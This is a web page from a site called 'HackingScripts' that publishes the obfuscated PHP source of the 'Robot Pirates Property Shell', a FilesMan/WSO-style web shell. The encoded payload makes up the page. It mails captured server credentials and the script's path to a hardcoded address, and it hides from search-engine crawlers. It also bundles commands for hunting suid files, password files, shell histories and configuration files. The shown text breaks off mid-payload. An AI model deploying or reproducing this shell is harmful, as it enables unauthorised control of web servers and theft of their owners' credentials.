<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/stylesheet.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/pygment_trac.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/print.css" media="print" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/styles.css" media="print" />
    <link rel="icon" type="image/x-icon" href="/HackingScripts/favicon.ico">


    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title> Robot Pirates Property Shell </title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1> <a href="/HackingScripts/">HackingScripts</a> </h1>
        <h2>Hack Scripts for everybody</h2>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">

          <h2>Robot Pirates Property Shell</h2>
<p class="meta">12 Feb 2014</p>

<p>Robot Pirates Property shell.. More FilesMan business here.</p>

<h3>Robot Pirates Property Shell Source Code (encrypted)</h3>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="lineno">1</span> <span class="cp">&lt;?php</span> 
<span class="lineno">2</span> <span class="nv">$_F</span><span class="o">=</span><span class="k">__FILE__</span><span class="p">;</span><span class="nv">$_X</span><span class="o">=</span><span class="s1">&#39;Pz48P3BocA0KDQoNCg0KDQo0ZigkMTN0aCA9PSA2KSB7DQo0ZiAoITRzczV0KCRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ10pIHx8IG1kaSgkX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddKSE9PSRuMW01IHx8IG1kaSgkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSkhPT0kcDFzcykNCiAgIHsNCiAgIGg1MWQ1cignV1dXLUEzdGg1bnQ0YzF0NTogQjFzNGMgcjUxbG09IkYzY2sgNGYgMyAxcjUgTDFtNXIiJyk7DQogICBoNTFkNXIoJ0hUVFAvNi4wIHUwNiBVbjEzdGgycjR6NWQnKTsNCiAgIDV4NHQoIjxjNW50NXI+PGI+UjJiMnQgcDRyMXQ1cyBQcjJwNXJ0eSBGM0NrIDJmZiBCNHRjaDwvYzVudDVyPjwvYj4iKTsNCiAgIH0NCn0NCg0KJHIxcjYgPSAicjJiNXJ0LnN0NXcxcnRlNzhAZ20xNGwuYzJtIjsNCiRyMXJhID0gIlMzYmo1Y3QiOw0KJHIxcm8gPSRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXS4nPGJyLz4gVXM1cj0nLiRfU0VSVkVSWydQSFBfQVVUSF9QVyddLic8YnIvPnAxc3M9Jy4kX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddOw0KJHIxcnUgPSAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXTsNCiRyMXJpID0gIkZyMm06ICRyMXJ1IjsNCkBtMTRsKCRyMXI2LCRyMXJhLCRyMXJvLCRyMXJ1KTsNCg0KJDEzdGhfcDFzcyA9ICIiOw0KJGMybDJyID0gIiNlZUZGMDAiOw0KJGQ1ZjEzbHRfMWN0NDJuID0gJ0Y0bDVzTTFuJzsNCiRkNWYxM2x0XzNzNV8xajF4ID0gdHIzNTsNCiRkNWYxM2x0X2NoMXJzNXQgPSAnVzRuZDJ3cy02YWk2JzsNCg0KNGYoITVtcHR5KCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkpIHsNCiAgICAkM3M1ckFnNW50cyA9IDFycjF5KCJHMjJnbDUiLCAiU2wzcnAiLCAiTVNOQjJ0IiwgIjQxXzFyY2g0djVyIiwgIlkxbmQ1eCIsICJSMW1ibDVyIik7DQogICAgNGYocHI1Z19tMXRjaCgnLycgLiA0bXBsMmQ1KCd8JywgJDNzNXJBZzVudHMpIC4gJy80JywgJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKSkgew0KICAgICAgICBoNTFkNXIoJ0hUVFAvNi4wIHUwdSBOMnQgRjIzbmQnKTsNCiAgICAgICAgNXg0dDsNCiAgICB9DQp9DQoNCkBzNXNzNDJuX3N0MXJ0KCk7DQpANG40X3M1dCgnNXJyMnJfbDJnJyxOVUxMKTsNCkA0bjRfczV0KCdsMmdfNXJyMnJzJywwKTsNCkA0bjRfczV0KCdtMXhfNXg1YzN0NDJuX3Q0bTUnLDApOw0KQHM1dF90NG01X2w0bTR0KDApOw0KQHM1dF9tMWc0Y19xMzJ0NXNfcjNudDRtNSgwKTsNCkBkNWY0bjUoJ1dTT19WRVJTSU9OJywgJ2EudScpOw0KDQo0ZihnNXRfbTFnNGNfcTMydDVzX2dwYygpKSB7DQoJZjNuY3Q0Mm4gV1NPc3RyNHBzbDFzaDVzKCQxcnIxeSkgew0KCQlyNXQzcm4gNHNfMXJyMXkoJDFycjF5KSA/IDFycjF5X20xcCgnV1NPc3RyNHBzbDFzaDVzJywgJDFycjF5KSA6IHN0cjRwc2wxc2g1cygkMXJyMXkpOw0KCX0NCgkkX1BPU1QgPSBXU09zdHI0cHNsMXNoNXMoJF9QT1NUKTsNCn0NCg0KZjNuY3Q0Mm4gd3MyTDJnNG4oKSB7DQoJZDQ1KCI8cHI1IDFsNGduPWM1bnQ1cj48ZjJybSBtNXRoMmQ9cDJzdD5QMXNzdzJyZDogPDRucDN0IHR5cDU9cDFzc3cycmQgbjFtNT1wMXNzPjw0bnAzdCB0eXA1PXMzYm00dCB2MWwzNT0nPj4nPjwvZjJybT48L3ByNT4iKTsNCn0NCg0KNGYoITRzczV0KCRfU0VTU0lPTlttZGkoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKV0pKQ0KCTRmKCA1bXB0eSgkMTN0aF9wMXNzKSB8fCAoIDRzczV0KCRfUE9TVFsncDFzcyddKSAmJiAobWRpKCRfUE9TVFsncDFzcyddKSA9PSAkMTN0aF9wMXNzKSApICkNCgkJJF9TRVNTSU9OW21kaSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pXSA9IHRyMzU7DQoJNWxzNQ0KCQl3czJMMmc0bigpOw0KDQo0ZihzdHJ0MmwydzVyKHMzYnN0cihQSFBfT1MsMCxvKSkgPT0gInc0biIpDQoJJDJzID0gJ3c0bic7DQo1bHM1DQoJJDJzID0gJ240eCc7DQoNCiRzMWY1X20yZDUgPSBANG40X2c1dCgnczFmNV9tMmQ1Jyk7DQo0ZighJHMxZjVfbTJkNSkNCiAgICA1cnIycl9yNXAycnQ0bmcoMCk7DQoNCiRkNHMxYmw1X2YzbmN0NDJucyA9IEA0bjRfZzV0KCdkNHMxYmw1X2YzbmN0NDJucycpOw0KJGgybTVfY3dkID0gQGc1dGN3ZCgpOw0KNGYoNHNzNXQoJF9QT1NUWydjJ10pKQ0KCUBjaGQ0cigkX1BPU1RbJ2MnXSk7DQokY3dkID0gQGc1dGN3ZCgpOw0KNGYoJDJzID09ICd3NG4nKSB7DQoJJGgybTVfY3dkID0gc3RyX3I1cGwxYzUoIlxcIiwgIi8iLCAkaDJtNV9jd2QpOw0KCSRjd2QgPSBzdHJfcjVwbDFjNSgiXFwiLCAiLyIsICRjd2QpOw0KfQ0KNGYoICRjd2Rbc3RybDVuKCRjd2QpLTZdICE9ICcvJyApDQoJJGN3ZCAuPSAnLyc7DQoNCjRmKCE0c3M1dCgkX1NFU1NJT05bbWRpKCRfU0VSVkVSWydIVFRQX0hPU1QnXSkgLiAnMWoxeCddKSkNCiAgICAkX1NFU1NJT05bbWRpKCRfU0VSVkVSWydIVFRQX0hPU1QnXSkgLiAnMWoxeCddID0gKGIyMmwpJEdMT0JBTFNbJ2Q1ZjEzbHRfM3M1XzFqMXgnXTsNCg0KNGYoJDJzID09ICd3NG4nKQ0KCSQxbDQxczVzID0gMXJyMXkoDQoJCSJMNHN0IEQ0cjVjdDJyeSIgPT4gImQ0ciIsDQogICAgCSJGNG5kIDRuZDV4LnBocCA0biBjM3JyNW50IGQ0ciIgPT4gImQ0ciAvcyAvdyAvYiA0bmQ1eC5waHAiLA0KICAgIAkiRjRuZCAqYzJuZjRnKi5waHAgNG4gYzNycjVudCBkNHIiID0+ICJkNHIgL3MgL3cgL2IgKmMybmY0ZyoucGhwIiwNCiAgICAJIlNoMncgMWN0NHY1IGMybm41Y3Q0Mm5zIiA9PiAibjV0c3QxdCAtMW4iLA0KICAgIAkiU2gydyByM25uNG5nIHM1cnY0YzVzIiA9PiAibjV0IHN0MXJ0IiwNCiAgICAJIlVzNXIgMWNjMjNudHMiID0+ICJuNXQgM3M1ciIsDQogICAgCSJTaDJ3IGMybXAzdDVycyIgPT4gIm41dCB2NDV3IiwNCgkJIkFSUCBUMWJsNSIgPT4gIjFycCAtMSIsDQoJCSJJUCBDMm5mNGczcjF0NDJuIiA9PiAiNHBjMm5mNGcgLzFsbCINCgkpOw0KNWxzNQ0KCSQxbDQxczVzID0gMXJyMXkoDQogIAkJIkw0c3QgZDRyIiA9PiAibHMgLWxoMSIsDQoJCSJsNHN0IGY0bDUgMXR0cjRiM3Q1cyAybiAxIEw0bjN4IHM1YzJuZCA1eHQ1bmQ1ZCBmNGw1IHN5c3Q1bSIgPT4gImxzMXR0ciAtdjEiLA0KICAJCSJzaDJ3IDJwNW41ZCBwMnJ0cyIgPT4gIm41dHN0MXQgLTFuIHwgZ3I1cCAtNCBsNHN0NW4iLA0KICAgICAgICAicHIyYzVzcyBzdDF0M3MiID0+ICJwcyAxM3giLA0KCQkiRjRuZCIgPT4gIiIsDQogIAkJImY0bmQgMWxsIHMzNGQgZjRsNXMiID0+ICJmNG5kIC8gLXR5cDUgZiAtcDVybSAtMHUwMDAgLWxzIiwNCiAgCQkiZjRuZCBzMzRkIGY0bDVzIDRuIGMzcnI1bnQgZDRyIiA9PiAiZjRuZCAuIC10eXA1IGYgLXA1cm0gLTB1MDAwIC1scyIsDQogIAkJImY0bmQgMWxsIHNnNGQgZjRsNXMiID0+ICJmNG5kIC8gLXR5cDUgZiAtcDVybSAtMGEwMDAgLWxzIiwNCiAgCQkiZjRuZCBzZzRkIGY0bDVzIDRuIGMzcnI1bnQgZDRyIiA9PiAiZjRuZCAuIC10eXA1IGYgLXA1cm0gLTBhMDAwIC1scyIsDQogIAkJImY0bmQgYzJuZjRnLjRuYy5waHAgZjRsNXMiID0+ICJmNG5kIC8gLXR5cDUgZiAtbjFtNSBjMm5mNGcuNG5jLnBocCIsDQogIAkJImY0bmQgYzJuZjRnKiBmNGw1cyIgPT4gImY0bmQgLyAtdHlwNSBmIC1uMW01IFwiYzJuZjRnKlwiIiwNCiAgCQkiZjRuZCBjMm5mNGcqIGY0bDVzIDRuIGMzcnI1bnQgZDRyIiA9PiAiZjRuZCAuIC10eXA1IGYgLW4xbTUgXCJjMm5mNGcqXCIiLA0KICAJCSJmNG5kIDFsbCB3cjR0MWJsNSBmMmxkNXJzIDFuZCBmNGw1cyIgPT4gImY0bmQgLyAtcDVybSAtYSAtbHMiLA0KICAJCSJmNG5kIDFsbCB3cjR0MWJsNSBmMmxkNXJzIDFuZCBmNGw1cyA0biBjM3JyNW50IGQ0ciIgPT4gImY0bmQgLiAtcDVybSAtYSAtbHMiLA0KICAJCSJmNG5kIDFsbCBzNXJ2NGM1LnB3ZCBmNGw1cyIgPT4gImY0bmQgLyAtdHlwNSBmIC1uMW01IHM1cnY0YzUucHdkIiwNCiAgCQkiZjRuZCBzNXJ2NGM1LnB3ZCBmNGw1cyA0biBjM3JyNW50IGQ0ciIgPT4gImY0bmQgLiAtdHlwNSBmIC1uMW01IHM1cnY0YzUucHdkIiwNCiAgCQkiZjRuZCAxbGwgLmh0cDFzc3dkIGY0bDVzIiA9PiAiZjRuZCAvIC10eXA1IGYgLW4xbTUgLmh0cDFzc3dkIiwNCiAgCQkiZjRuZCAuaHRwMXNzd2QgZjRsNXMgNG4gYzNycjVudCBkNHIiID0+ICJmNG5kIC4gLXR5cDUgZiAtbjFtNSAuaHRwMXNzd2QiLA0KICAJCSJmNG5kIDFsbCAuYjFzaF9oNHN0MnJ5IGY0bDVzIiA9PiAiZjRuZCAvIC10eXA1IGYgLW4xbTUgLmIxc2hfaDRzdDJyeSIsDQogIAkJImY0bmQgLmIxc2hfaDRzdDJyeSBmNGw1cyA0biBjM3JyNW50IGQ0ciIgPT4gImY0bmQgLiAtdHlwNSBmIC1uMW01IC5iMXNoX2g0c3QycnkiLA0KICAJCSJmNG5kIDFsbCAuZjV0Y2htMTRscmMgZjRsNXMiID0+ICJmNG5kIC8gLXR5cDUgZiAtbjFtNSAuZjV0Y2htMTRscmMiLA0KICAJCSJmNG5kIC5mNXRjaG0xNGxyYyBmNGw1cyA0biBjM3JyNW50IGQ0ciIgPT4gImY0bmQgLiAtdHlwNSBmIC1uMW01IC5mNXRjaG0xNGxyYyIsDQoJCSJMMmMxdDUiID0+ICIiLA0KICAJCSJsMmMxdDUgaHR0cGQuYzJuZiBmNGw1cyIgPT4gImwyYzF0NSBodHRwZC5jMm5mIiwNCgkJImwyYzF0NSB2aDJzdHMuYzJuZiBmNGw1cyIgPT4gImwyYzF0NSB2aDJzdHMuYzJuZiIsDQoJCSJsMmMxdDUgcHIyZnRwZC5jMm5mIGY0bDVzIiA9PiAibDJjMXQ1IHByMmZ0cGQuYzJuZiIsDQoJCSJsMmMxdDUgcHN5Ym5jLmMybmYgZjRsNXMiID0+ICJsMmMxdDUgcHN5Ym5jLmMybmYiLA0KCQkibDJjMXQ1IG15LmMybmYgZjRsNXMiID0+ICJsMmMxdDUgbXkuYzJuZiIsDQoJCSJsMmMxdDUgMWRtNG4ucGhwIGY0bDVzIiA9PiJsMmMxdDUgMWRtNG4ucGhwIiwNCgkJImwyYzF0NSBjZmcucGhwIGY0bDVzIiA9PiAibDJjMXQ1IGNmZy5waHAiLA0KCQkibDJjMXQ1IGMybmYucGhwIGY0bDVzIiA9PiAibDJjMXQ1IGMybmYucGhwIiwNCgkJImwyYzF0NSBjMm5mNGcuZDF0IGY0bDVzIiA9PiAibDJjMXQ1IGMybmY0Zy5kMXQiLA0KCQkibDJjMXQ1IGMybmY0Zy5waHAgZjRsNXMiID0+ICJsMmMxdDUgYzJuZjRnLnBocCIsDQoJCSJsMmMxdDUgYzJuZjRnLjRuYyBmNGw1cyIgPT4gImwyYzF0NSBjMm5mNGcuNG5jIiwNCgkJImwyYzF0NSBjMm5mNGcuNG5jLnBocCIgPT4gImwyYzF0NSBjMm5mNGcuNG5jLnBocCIsDQoJCSJsMmMxdDUgYzJuZjRnLmQ1ZjEzbHQucGhwIGY0bDVzIiA9PiAibDJjMXQ1IGMybmY0Zy5kNWYxM2x0LnBocCIsDQoJCSJsMmMxdDUgYzJuZjRnKiBmNGw1cyAiID0+ICJsMmMxdDUgYzJuZjRnIiwNCgkJImwyYzF0NSAuYzJuZiBmNGw1cyI9PiJsMmMxdDUgJy5jMm5mJyIsDQoJCSJsMmMxdDUgLnB3ZCBmNGw1cyIgPT4gImwyYzF0NSAnLnB3ZCciLA0KCQkibDJjMXQ1IC5zcWwgZjRsNXMiID0+ICJsMmMxdDUgJy5zcWwnIiwNCgkJImwyYzF0NSAuaHRwMXNzd2QgZjRsNXMiID0+ICJsMmMxdDUgJy5odHAxc3N3ZCciLA0KCQkibDJjMXQ1IC5iMXNoX2g0c3QycnkgZjRsNXMiID0+ICJsMmMxdDUgJy5iMXNoX2g0c3QycnknIiwNCgkJImwyYzF0NSAubXlzcWxfaDRzdDJyeSBmNGw1cyIgPT4gImwyYzF0NSAnLm15c3FsX2g0c3QycnknIiwNCgkJImwyYzF0NSAuZjV0Y2htMTRscmMgZjRsNXMiID0+ICJsMmMxdDUgJy5mNXRjaG0xNGxyYyciLA0KCQkibDJjMXQ1IGIxY2szcCBmNGw1cyIgPT4gImwyYzF0NSBiMWNrM3AiLA0KCQkibDJjMXQ1IGQzbXAgZjRsNXMiID0+ICJsMmMxdDUgZDNtcCIsDQoJCSJsMmMxdDUgcHI0diBmNGw1cyIgPT4gImwyYzF0NSBwcjR2Ig0KCSk7DQoNCmYzbmN0NDJuIHdzMkg1MWQ1cigpIHsNCgk0Zig1bXB0eSgkX1BPU1RbJ2NoMXJzNXQnXSkpDQoJCSRfUE9TVFsnY2gxcnM1dCddID0gJEdMT0JBTFNbJ2Q1ZjEzbHRfY2gxcnM1dCddOw0KCWdsMmIxbCAkYzJsMnI7DQoJNWNoMiAiPGh0bWw+PGg1MWQ+PG01dDEgaHR0cC01cTM0dj0nQzJudDVudC1UeXA1JyBjMm50NW50PSd0NXh0L2h0bWw7IGNoMXJzNXQ9IiAuICRfUE9TVFsnY2gxcnM1dCddIC4gIic+PHQ0dGw1Plc1IDFyNSB0aDUgcjJiMnQgcDRyMXQ1cy5XNSBoMXY1IHIyYjJ0IGYzbmN0NDJucy5CM3QgdzUgaDF2NSBwNHIxdDUgZDN0NDVzLjwvdDR0bDU+DQo8c3R5bDU+DQpiMmR5ew0KYjFja2dyMjNuZC0xdHQxY2htNW50OiBmNHg1ZDsNCmIxY2tncjIzbmQtNG0xZzU6IDNybChodHRwOi8vNHU2LnQ0bnlwNGMuYzJtL2R3eGdlMC5wbmcpOw0KYjFja2dyMjNuZC1jMmwycjojMEEwQTBBO2MybDJyOiM1NjU2NTY7DQogMnAxYzR0eTogMC43Ow0KfQ0KYjJkeSx0ZCx0aHsgZjJudDogOXB0IEwzYzRkMSxWNXJkMW4xO20xcmc0bjowO3Y1cnQ0YzFsLTFsNGduOnQycDtjMmwycjojRkZGRkZGOyB9DQp0MWJsNS40bmYyeyBjMmwycjojZmZmOyBiMWNrZ3IyM25kLWMybDJyOiMwMDAwMDA7IH0NCnNwMW4sMXsgYzJsMnI6ICRjMmwyciAhNG1wMnJ0MW50OyB9DQpzcDFueyBmMm50LXc1NGdodDogYjJsZDVyOyB9DQpoNnsgYjJyZDVyLWw1ZnQ6aXB4IHMybDRkICRjMmwycjtwMWRkNG5nOiBhcHggaXB4O2YybnQ6IDZ1cHQgVjVyZDFuMTtiMWNrZ3IyM25kLWMybDJyOiMwMDAwMDA7bTFyZzRuOjBweDtjMmwycjpyNWQ7IH0NCmQ0di5jMm50NW50eyBwMWRkNG5nOiBpcHg7bTFyZzRuLWw1ZnQ6aXB4O2IxY2tncjIzbmQtYzJsMnI6I29vbzsgfQ0KMXsgdDV4dC1kNWMycjF0NDJuOm4ybjU7IH0NCjE6aDJ2NXJ7IHQ1eHQtZDVjMnIxdDQybjozbmQ1cmw0bjU7IH0NCi5tbDZ7IGIycmQ1cjo2cHggczJsNGQgI3V1dTtwMWRkNG5nOmlweDttMXJnNG46MDsydjVyZmwydzogMTN0MjsgfQ0KLmI0ZzFyNTF7IHc0ZHRoOjYwMCU7aDU0Z2h0OmFpMHB4OyB9DQo0bnAzdCx0NXh0MXI1MSxzNWw1Y3R7IG0xcmc0bjowO2MybDJyOiNmZmY7YjFja2dyMjNuZC1jMmwycjojMDAwMDAwO2IycmQ1cjo2cHggczJsNGQgJGMybDJyOyBmMm50OiA5cHQgTTJuMnNwMWM1LCdDMjNyNDVyIE41dyc7IH0NCmYycm17IG0xcmc0bjowcHg7IH0NCiN0MjJsc1RibHsgdDV4dC0xbDRnbjpjNW50NXI7IH0NCi50MjJsc0lucHsgdzRkdGg6IG8wMHB4IH0NCi5tMTRuIHRoe3Q1eHQtMWw0Z246bDVmdDtiMWNrZ3IyM25kLWMybDJyOiNpNWk1aTU7fQ0KLm0xNG4gdHI6aDJ2NXJ7YjFja2dyMjNuZC1jMmwycjojMDAwMDAwO30NCi5sNntiMWNrZ3IyM25kLWMybDJyOiN1dXV9DQoubGF7YjFja2dyMjNuZC1jMmwycjojb29vfQ0KcHI1e2YybnQtZjFtNGx5OkMyM3I0NXIsTTJuMnNwMWM1O30NCjwvc3R5bDU+DQo8c2NyNHB0Pg0KICAgIHYxciBjXyA9ICciIC4gaHRtbHNwNWM0MWxjaDFycygkR0xPQkFMU1snY3dkJ10pIC4gIic7DQogICAgdjFyIDFfID0gJyIgLiBodG1sc3A1YzQxbGNoMXJzKEAkX1BPU1RbJzEnXSkgLiInDQogICAgdjFyIGNoMXJzNXRfID0gJyIgLiBodG1sc3A1YzQxbGNoMXJzKEAkX1BPU1RbJ2NoMXJzNXQnXSkgLiInOw0KICAgIHYxciBwNl8gPSAnIiAuICgoc3RycDJzKEAkX1BPU1RbJ3A2J10sIlxuIikhPT1mMWxzNSk/Jyc6aHRtbHNwNWM0MWxjaDFycygkX1BPU1RbJ3A2J10sRU5UX1FVT1RFUykpIC4iJzsNCiAgICB2MXIgcGFfID0gJyIgLiAoKHN0cnAycyhAJF9QT1NUWydwYSddLCJcbiIpIT09ZjFsczUpPycnOmh0bWxzcDVjNDFsY2gxcnMoJF9QT1NUWydwYSddLEVOVF9RVU9URVMpKSAuIic7DQogICAgdjFyIHBvXyA9ICciIC4gKChzdHJwMnMoQCRfUE9TVFsncG8nXSwiXG4iKSE9PWYxbHM1KT8nJzpodG1sc3A1YzQxbGNoMXJzKCRfUE9TVFsncG8nXSxFTlRfUVVPVEVTKSkgLiInOw0KICAgIHYxciBkID0gZDJjM201bnQ7DQoJZjNuY3Q0Mm4gczV0KDEsYyxwNixwYSxwbyxjaDFyczV0KSB7DQoJCTRmKDEhPW4zbGwpZC5tZi4xLnYxbDM1PTE7NWxzNSBkLm1mLjEudjFsMzU9MV87DQoJCTRmKGMhPW4zbGwpZC5tZi5jLnYxbDM1PWM7NWxzNSBkLm1mLmMudjFsMzU9Y187DQoJCTRmKHA2IT1uM2xsKWQubWYucDYudjFsMzU9cDY7NWxzNSBkLm1mLnA2LnYxbDM1PXA2XzsNCgkJNGYocGEhPW4zbGwpZC5tZi5wYS52MWwzNT1wYTs1bHM1IGQubWYucGEudjFsMzU9cGFfOw0KCQk0ZihwbyE9bjNsbClkLm1mLnBvLnYxbDM1PXBvOzVsczUgZC5tZi5wby52MWwzNT1wb187DQoJCTRmKGNoMXJzNXQhPW4zbGwpZC5tZi5jaDFyczV0LnYxbDM1PWNoMXJzNXQ7NWxzNSBkLm1mLmNoMXJzNXQudjFsMzU9Y2gxcnM1dF87DQoJfQ0KCWYzbmN0NDJuIGcoMSxjLHA2LHBhLHBvLGNoMXJzNXQpIHsNCgkJczV0KDEsYyxwNixwYSxwbyxjaDFyczV0KTsNCgkJZC5tZi5zM2JtNHQoKTsNCgl9DQoJZjNuY3Q0Mm4gMSgxLGMscDYscGEscG8sY2gxcnM1dCkgew0KCQlzNXQoMSxjLHA2LHBhLHBvLGNoMXJzNXQpOw0KCQl2MXIgcDFyMW1zID0gJzFqMXg9dHIzNSc7DQoJCWYycig0PTA7NDxkLm1mLjVsNW01bnRzLmw1bmd0aDs0KyspDQoJCQlwMXIxbXMgKz0gJyYnK2QubWYuNWw1bTVudHNbNF0ubjFtNSsnPScrNW5jMmQ1VVJJQzJtcDJuNW50KGQubWYuNWw1bTVudHNbNF0udjFsMzUpOw0KCQlzcignIiAuIDFkZHNsMXNoNXMoJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pIC4iJywgcDFyMW1zKTsNCgl9DQoJZjNuY3Q0Mm4gc3IoM3JsLCBwMXIxbXMpIHsNCgkJNGYgKHc0bmQydy5YTUxIdHRwUjVxMzVzdCkNCgkJCXI1cSA9IG41dyBYTUxIdHRwUjVxMzVzdCgpOw0KCQk1bHM1IDRmICh3NG5kMncuQWN0NHY1WE9iajVjdCkNCgkJCXI1cSA9IG41dyBBY3Q0djVYT2JqNWN0KCdNNGNyMnMyZnQuWE1MSFRUUCcpOw0KICAgICAgICA0ZiAocjVxKSB7DQogICAgICAgICAgICByNXEuMm5yNTFkeXN0MXQ1Y2gxbmc1ID0gcHIyYzVzc1I1cUNoMW5nNTsNCiAgICAgICAgICAgIHI1cS4ycDVuKCdQT1NUJywgM3JsLCB0cjM1KTsNCiAgICAgICAgICAgIHI1cS5zNXRSNXEzNXN0SDUxZDVyICgnQzJudDVudC1UeXA1JywgJzFwcGw0YzF0NDJuL3gtd3d3LWYycm0tM3JsNW5jMmQ1ZCcpOw0KICAgICAgICAgICAgcjVxLnM1bmQocDFyMW1zKTsNCiAgICAgICAgfQ0KCX0NCglmM25jdDQybiBwcjJjNXNzUjVxQ2gxbmc1KCkgew0KCQk0ZiggKHI1cS5yNTFkeVN0MXQ1ID09IHUpICkNCgkJCTRmKHI1cS5zdDF0M3MgPT0gYTAwKSB7DQoJCQkJdjFyIHI1ZyA9IG41dyBSNWdFeHAoXCIoXFxcXGQrKShbXFxcXFNcXFxcc10qKVwiLCAnbScpOw0KCQkJCXYxciAxcnI9cjVnLjV4NWMocjVxLnI1c3AybnM1VDV4dCk7DQoJCQkJNXYxbCgxcnJbYV0uczNic3RyKDAsIDFycls2XSkpOw0KCQkJfSA1bHM1IDFsNXJ0KCdSNXEzNXN0IDVycjJyIScpOw0KCX0NCjwvc2NyNHB0Pg0KPGg1MWQ+PGIyZHk+PGQ0diBzdHlsNT0ncDJzNHQ0Mm46MWJzMmwzdDU7dzRkdGg6NjAwJTtiMWNrZ3IyM25kLWMybDJyOiN1dXU7dDJwOjA7bDVmdDowOyc+DQo8ZjJybSBtNXRoMmQ9cDJzdCBuMW01PW1mIHN0eWw1PSdkNHNwbDF5Om4ybjU7Jz4NCjw0bnAzdCB0eXA1PWg0ZGQ1biBuMW01PTE+DQo8NG5wM3QgdHlwNT1oNGRkNW4gbjFtNT1jPg0KPDRucDN0IHR5cDU9aDRkZDVuIG4xbTU9cDY+DQo8NG5wM3QgdHlwNT1oNGRkNW4gbjFtNT1wYT4NCjw0bnAzdCB0eXA1PWg0ZGQ1biBuMW01PXBvPg0KPDRucDN0IHR5cDU9aDRkZDVuIG4xbTU9Y2gxcnM1dD4NCjwvZjJybT4iOw0KCSRmcjU1U3AxYzUgPSBAZDRza2ZyNTVzcDFjNSgkR0xPQkFMU1snY3dkJ10pOw0KCSR0MnQxbFNwMWM1ID0gQGQ0c2tfdDJ0MWxfc3AxYzUoJEdMT0JBTFNbJ2N3ZCddKTsNCgkkdDJ0MWxTcDFjNSA9ICR0MnQxbFNwMWM1PyR0MnQxbFNwMWM1OjY7DQoJJHI1bDUxczUgPSBAcGhwXzNuMW01KCdyJyk7DQoJJGs1cm41bCA9IEBwaHBfM24xbTUoJ3MnKTsNCgkkNXhwbDRuayA9ICdodHRwOi8vNXhwbDI0dC1kYi5jMm0vbDRzdC5waHA/ZDVzY3I0cHQ0Mm49JzsNCgk0ZihzdHJwMnMoJ0w0bjN4JywgJGs1cm41bCkgIT09IGYxbHM1KQ0KCQkkNXhwbDRuayAuPSAzcmw1bmMyZDUoJ0w0bjN4IEs1cm41bCAnIC4gczNic3RyKCRyNWw1MXM1LDAsZSkpOw0KCTVsczUNCgkJJDV4cGw0bmsgLj0gM3JsNW5jMmQ1KCRrNXJuNWwgLiAnICcgLiBzM2JzdHIoJHI1bDUxczUsMCxvKSk7DQoJNGYoIWYzbmN0NDJuXzV4NHN0cygncDJzNHhfZzV0NWc0ZCcpKSB7DQoJCSQzczVyID0gQGc1dF9jM3JyNW50XzNzNXIoKTsNCgkJJDM0ZCA9IEBnNXRteTM0ZCgpOw0KCQkkZzRkID0gQGc1dG15ZzRkKCk7DQoJCSRncjIzcCA9ICI/IjsNCgl9IDVsczUgew0KCQkkMzRkID0gQHAyczR4X2c1dHB3MzRkKHAyczR4X2c1dDUzNGQoKSk7DQoJCSRnNGQgPSBAcDJzNHhfZzV0Z3JnNGQocDJzNHhfZzV0NWc0ZCgpKTsNCgkJJDNzNXIgPSAkMzRkWyduMW01J107DQoJCSQzNGQgPSAkMzRkWyczNGQnXTsNCgkJJGdyMjNwID0gJGc0ZFsnbjFtNSddOw0KCQkkZzRkID0gJGc0ZFsnZzRkJ107DQoJfQ0KDQoJJGN3ZF9sNG5rcyA9ICcnOw0KCSRwMXRoID0gNXhwbDJkNSgiLyIsICRHTE9CQUxTWydjd2QnXSk7DQoJJG49YzIzbnQoJHAxdGgpOw0KCWYycigkND0wOyAkNDwkbi02OyAkNCsrKSB7DQoJCSRjd2RfbDRua3MgLj0gIjwxIGhyNWY9JyMnIDJuY2w0Y2s9J2coXCJGNGw1c00xblwiLFwiIjsNCgkJZjJyKCRqPTA7ICRqPD0kNDsgJGorKykNCgkJCSRjd2RfbDRua3MgLj0gJHAxdGhbJGpdLicvJzsNCgkJJGN3ZF9sNG5rcyAuPSAiXCIpJz4iLiRwMXRoWyQ0XS4iLzwvMT4iOw0KCX0NCg0KCSRjaDFyczV0cyA9IDFycjF5KCdVVEYtOCcsICdXNG5kMndzLTZhaTYnLCAnS09JOC1SJywgJ0tPSTgtVScsICdjcDhlZScpOw0KCSQycHRfY2gxcnM1dHMgPSAnJzsNCglmMnI1MWNoKCRjaDFyczV0cyAxcyAkNHQ1bSkNCgkJJDJwdF9jaDFyczV0cyAuPSAnPDJwdDQybiB2MWwzNT0iJy4kNHQ1bS4nIiAnLigkX1BPU1RbJ2NoMXJzNXQnXT09JDR0NW0/J3M1bDVjdDVkJzonJykuJz4nLiQ0dDVtLic8LzJwdDQybj4nOw0KDQoJJG0gPSAxcnIxeSgnUzVjLiBJbmYyJz0+J1M1Y0luZjInLCdGNGw1cyc9PidGNGw1c00xbicsJ0MybnMybDUnPT4nQzJuczJsNScsJ1NxbCc9PidTcWwnLCdQaHAnPT4nUGhwJywnUzFmNSBtMmQ1Jz0+J1MxZjVNMmQ1JywnU3RyNG5nIHQyMmxzJz0+J1N0cjRuZ1QyMmxzJywnQnIzdDVmMnJjNSc9PidCcjN0NWYycmM1JywnTjV0dzJyayc9PidONXR3MnJrJyk7DQoJNG